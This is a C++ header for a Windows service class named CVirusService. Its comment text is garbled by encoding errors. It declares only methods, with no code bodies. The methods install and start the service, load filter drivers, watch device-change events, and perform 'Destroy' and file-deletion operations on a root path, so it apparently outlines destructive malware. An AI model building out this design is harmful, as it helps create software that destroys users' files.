/*!
\warning ��Ȩ���� (C) 2007 ���ֹ����ң���������Ȩ����
\file    VirusService.h
\brief   ����������
\version 1.0
\author  ��  �� (kl222@126.com)
\date    2007��5��31��  15:27:31
\par     ������:
         Microsoft Visual Studio 8.0 ���� C/C++ 8.0
*/

#pragma once
#include "..\..\System\Service\Service.h"
#include "..\..\System\System\System.h"
#include "..\..\System\File\FileEx.h"
#include "FileManage.h"
#include <string>

using namespace std;

#ifdef _UNICODE
#define _tstring wstring
#else
#define _tstring string
#endif // ���� #ifdef

class CVirusService :
	public CService
{
public:
	CVirusService(const TCHAR* name_);
	~CVirusService(void);

	_tstring GetName(){return m_ServiceName;}

	// ����
	// - Service main procedure - override to implement a service
	virtual DWORD serviceMain(int argc, TCHAR * argv[]);
	int run();
	virtual void stop();
	INT UnLoad();

	// ��װ
	BOOL InstallAndStartService();

	// �ƻ�
	BOOL IsDestroy();
	BOOL Destroy();
	DWORD DestroyOperateThread(LPCTSTR szRoot);
	static BOOL DestroyOperate(LPCTSTR szRoot);
	static BOOL DeleteFileOperate(LPCTSTR szFile);

private:
	BOOL IsInstalledService(LPCTSTR pszServiceName);
	//��ʼ��������
	BOOL StartFilterDrivers();
	//���ù���
	INT SetFilters();

	BOOL RegisterWindow();
	LRESULT OnDeviceChange(WPARAM wParam, LPARAM lParam);
	static LRESULT CALLBACK WndProcess(
		HWND hwnd,             // handle to window
		UINT uMsg,             // message identifier
		WPARAM wParam,         // first message parameter
		LPARAM lParam          // second message parameter
		);
	HWND m_hWnd;               //���ڵľ��

	_tstring m_ServiceName;    //������
	CFileManage m_FileManage;  //�ļ�����

};
